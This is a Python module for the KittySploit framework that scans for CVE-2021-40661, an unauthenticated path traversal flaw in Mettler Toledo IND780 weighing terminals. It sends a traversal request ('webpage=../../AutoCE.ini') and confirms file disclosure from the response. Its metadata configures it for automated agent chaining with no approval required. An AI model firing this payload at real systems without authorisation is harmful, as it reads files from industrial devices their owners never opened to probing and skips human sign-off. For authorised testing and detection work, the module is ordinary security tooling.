#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""IND780 Advanced Weighing Terminals Build 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'IND780 - Local File Inclusion Detection',
        'description': "IND780 Advanced Weighing Terminals Build 8.0.07 March 19, 2018 (SS Label 'IND780_8.0.07'), Version 7.2.10 June 18, 2012 (SS Label 'IND780_7.2.10') is vulnerable to unauthenticated local file inclusion. It is possible to traverse the folders of the affected host by providing a relative path to the 'webpage' parameter in AutoCE.ini. This could allow a remote attacker to access additional files on the affected system.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'ind780', 'lfi', 'mt', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://sidsecure.au/blog/cve-2021-40661/?_sm_pdc=1&_sm_rid=MRRqb4KBDnjBMJk24b40LMS3SKqPMqb4KVn32Kr',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40661',
            'https://www.mt.com/au/en/home/products/Industrial_Weighing_Solutions/Terminals-and-Controllers/terminals-bench-floor-scales/advanced-bench-floor-applications/IND780/IND780_.html#overviewpm',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-40661',
            'https://github.com/Live-Hack-CVE/CVE-2021-40661',
        ],
        'cve': 'CVE-2021-40661',
    }

    def run(self):
        r = self.http_request(method="GET", path='/IND780/excalweb.dll?webpage=../../AutoCE.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('ExePath=\\Windows', 'WorkDir=\\Windows',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="IND780 - Local File Inclusion detected",
                path='/IND780/excalweb.dll?webpage=../../AutoCE.ini',
            )
            return True
        return False

